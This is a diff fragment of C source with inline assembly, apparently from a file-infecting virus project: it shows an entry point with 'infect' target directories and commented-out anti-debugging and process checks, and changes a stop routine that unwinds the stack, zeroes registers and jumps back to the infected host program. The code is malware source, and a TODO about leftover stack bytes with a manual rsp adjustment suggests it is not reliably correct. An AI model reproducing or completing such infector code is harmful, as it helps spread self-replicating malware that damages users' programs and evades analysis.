@@ -41,7 +41,6 @@ int   entry_point(void *magic) {
   char    infectDir2[] = "/tmp/test2";
   char    procName[] = "/proc/";
 
-  /* asm("int3"); */
   /* if (checkProcess(procName) != 0) */
   /*   return (stop(1, magic)); */
   /* if (preventDebug() == -1) */
@@ -59,22 +58,18 @@ int   entry_point(void *magic) {
 static int   stop(int status, void *magic) {
   if (magic == (void *)0x42)
     return (status);
+  register size_t rsp asm("rsp");
   asm("leave\n\t"
-      "mov $0, %rax\n\t"
-      "mov $0, %rbx\n\t"
+      "leave");
+  // TODO Find why there is still 16 bytes on stack
+  rsp += 16;
+  asm("mov $0, %rbx\n\t"
       "mov $0, %rcx\n\t"
       "mov $0, %rdx\n\t"
       "mov $0, %rsi\n\t"
       "mov $0, %rdi\n\t"
-      "mov $0, %r8\n\t"
-      "mov $0, %r9\n\t"
-      "mov $0, %r10\n\t"
-      "mov $0, %r11\n\t"
-      "mov $0, %r12\n\t"
-      "mov $0, %r13\n\t"
-      "mov $0, %r14\n\t"
-      "mov $0, %r15\n\t"
-      "leave\n\t"
+      "mov $0, %rax\n\t"
+      "mov $0, %rbp\n\t"
       "jmp endSC");
   return (status);
 }
